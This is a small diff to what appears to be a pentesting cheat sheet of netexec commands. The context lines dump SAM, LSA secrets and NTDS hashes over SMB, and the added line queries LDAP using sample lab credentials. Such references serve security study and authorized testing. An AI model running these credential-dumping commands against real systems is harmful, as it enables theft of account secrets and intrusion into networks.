@@ -207,6 +207,9 @@ netexec smb <ip> -u "user" -p "password" --shares
 netexec smb <ip> --local-auth -u <username> -p <password> --sam
 netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 netexec smb <ip> -u <username> -p <password> --ntds
+nxc ldap 192.168.154.134 -u fcastle -p Password@123 --get-sid
+
+
 ```
 
 
